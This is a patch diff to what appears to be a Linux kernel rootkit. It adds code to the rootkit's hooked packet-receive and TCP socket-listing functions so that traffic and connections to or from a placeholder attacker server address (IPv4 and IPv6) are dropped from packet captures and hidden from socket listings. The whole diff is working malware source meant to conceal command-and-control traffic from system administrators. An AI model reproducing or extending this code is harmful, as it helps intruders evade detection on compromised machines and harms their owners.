@@ -9,6 +9,7 @@ static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
 static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
         struct packet_type *pt, struct net_device *orig_dev);
 
+static const struct in6_addr ipv6_ip_ = YOUR_SRV_IPv6;
 static notrace int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
         struct packet_type *pt, struct net_device *orig_dev)
 {
@@ -29,12 +30,18 @@ static notrace int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *de
             if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT)
                 return NET_RX_DROP;
         }
+        if (iph->daddr == in_aton(YOUR_SRV_IP) || iph->saddr == in_aton(YOUR_SRV_IP)) {
+            return NET_RX_DROP;
+        }
     } else if (skb->protocol == htons(ETH_P_IPV6)) {
         ip6h = ipv6_hdr(skb);
         if (ip6h->nexthdr == IPPROTO_TCP) {
             tcph = (void *)ip6h + sizeof(*ip6h);
             if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT)
                 return NET_RX_DROP;
+        }
+        if (ipv6_addr_equal(&ip6h->daddr, &ipv6_ip_) || ipv6_addr_equal(&ip6h->saddr, &ipv6_ip_)) {
+            return NET_RX_DROP;
         }
     }
 
@@ -51,6 +58,9 @@ static notrace asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *
     int sport = ntohs(inet_sk(sk)->inet_sport);
     int dport = ntohs(inet_sk(sk)->inet_dport);
 
+    if (inet_sk(sk)->inet_saddr == in_aton(YOUR_SRV_IP) || inet_sk(sk)->inet_daddr == in_aton(YOUR_SRV_IP))
+        return 0;
+
     if (sport == PORT || dport == PORT)
         return 0;
 
@@ -65,6 +75,9 @@ static notrace asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *
 
     int sport = ntohs(inet_sk(sk)->inet_sport);
     int dport = ntohs(inet_sk(sk)->inet_dport);
+
+    if (ipv6_addr_equal(&sk->sk_v6_rcv_saddr, &ipv6_ip_) || ipv6_addr_equal(&sk->sk_v6_daddr, &ipv6_ip_))
+        return 0;
 
     if (sport == PORT || dport == PORT)
         return 0;
